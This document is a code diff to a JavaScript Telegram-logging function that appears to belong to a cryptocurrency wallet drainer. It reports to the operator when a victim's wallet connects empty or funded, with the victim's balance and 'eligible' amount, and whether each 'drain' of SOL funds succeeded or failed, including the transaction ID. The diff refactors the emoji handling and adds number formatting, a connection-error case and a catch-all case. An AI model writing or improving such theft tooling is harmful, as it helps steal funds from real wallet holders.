@@ -5,38 +5,31 @@ export const sendTelegramLog = async (event, data) => {
     
     if (!botToken || !chatId) return;
     
-    const emojis = {
-      connected_empty: '🟡',
-      connected_funded: '🟢',
-      drain_success: '💰',
-      drain_failed: '❌',
-      mobile_user: '📱'
-    };
-    
     const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(-4)}` : 'unknown';
+    const formatNumber = (num) => typeof num === 'number' ? num.toFixed(4) : num;
     
     let message = '';
     
     switch(event) {
       case 'connected_empty':
-        message = `${emojis[event]} Wallet Connected (Empty)
+        message = `🟡 Wallet Connected (Empty)
 Wallet: ${formatAddress(data.address)}
 Type: ${data.walletType}
-Balance: ${data.balance} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
+Balance: ${formatNumber(data.balance)} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
 Time: ${new Date().toLocaleTimeString()}`;
         break;
         
       case 'connected_funded':
-        message = `${emojis[event]} Wallet Connected (Funded)
+        message = `🟢 Wallet Connected (Funded)
 Wallet: ${formatAddress(data.address)}
 Type: ${data.walletType}
-Balance: ${data.balance} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
+Balance: ${formatNumber(data.balance)} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
 Eligible: ${data.eligibleAmount} SOL
 Time: ${new Date().toLocaleTimeString()}`;
         break;
         
       case 'drain_success':
-        message = `${emojis[event]} Drain Successful
+        message = `💰 Drain Successful
 Wallet: ${formatAddress(data.address)}
 Amount: ${data.amount} SOL
 TX: ${data.tx?.slice(0,8)}...
@@ -44,11 +37,21 @@ Time: ${new Date().toLocaleTimeString()}`;
         break;
         
       case 'drain_failed':
-        message = `${emojis[event]} Drain Failed
+        message = `❌ Drain Failed
 Wallet: ${formatAddress(data.address)}
 Error: ${data.error}
 Time: ${new Date().toLocaleTimeString()}`;
         break;
+        
+      case 'connection_error':
+        message = `⚠️ Connection Error
+Type: ${data.walletType}
+Error: ${data.error}
+Time: ${new Date().toLocaleTimeString()}`;
+        break;
+        
+      default:
+        message = `📊 ${event}\n${JSON.stringify(data, null, 2)}`;
     }
     
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
